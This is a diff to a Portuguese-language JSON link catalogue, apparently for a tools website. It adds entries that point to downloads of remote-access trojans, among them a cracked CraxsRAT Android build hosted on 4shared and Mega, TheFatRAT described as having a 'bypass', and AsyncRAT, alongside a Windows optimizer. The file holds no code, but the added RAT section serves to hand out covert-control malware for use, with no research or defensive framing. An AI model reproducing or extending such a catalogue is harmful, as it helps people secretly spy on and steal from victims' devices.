@@ -16,12 +16,48 @@
                 "link": "#"
             }
         ],
+        "RAT para Android": [
+            {
+                "nome": "CRAXSRAT 7.6",
+                "descricao": "RAT para Android (4shared)",
+                "icone": "fas fa-mobile-alt",
+                "link": "https://www.4shared.com/rar/yEukRYaqku/CraxsRat_76_Cracked.html?sop=true"
+            },
+            {
+                "nome": "CRAXSRAT (Mega)",
+                "descricao": "RAT para Android (Mega.nz)",
+                "icone": "fas fa-mobile-alt",
+                "link": "https://mega.nz/file/ENoQxTRT#7REEKdXb4IJqi0EQDpIZmzjKqJkxyF3rdC2X7-byT5o"
+            }
+        ],
+        "Otimização": [
+            {
+                "nome": "Optimizer",
+                "descricao": "Remove telemetria do Windows 10/11",
+                "icone": "fas fa-tachometer-alt",
+                "link": "https://github.com/hellzerg/optimizer/releases/download/16.7/Optimizer-16.7.exe"
+            }
+        ],
+        "RATs": [
+            {
+                "nome": "TheFatRAT",
+                "descricao": "RAT para Linux (com bypass)",
+                "icone": "fas fa-terminal",
+                "link": "https://github.com/screetsec/TheFatRat"
+            },
+            {
+                "nome": "AsyncRAT",
+                "descricao": "RAT para Windows (mais completo)",
+                "icone": "fas fa-desktop",
+                "link": "https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/releases/tag/v0.5.8"
+            }
+        ],
         "Test": [
             {
-            "nome": "hacking",
-            "descricao": "Hacking",
-            "icone": "fas fa-bug",
-            "link": "https://google.com"
+                "nome": "hacking",
+                "descricao": "Hacking",
+                "icone": "fas fa-bug",
+                "link": "https://google.com"
             }
         ]
     }
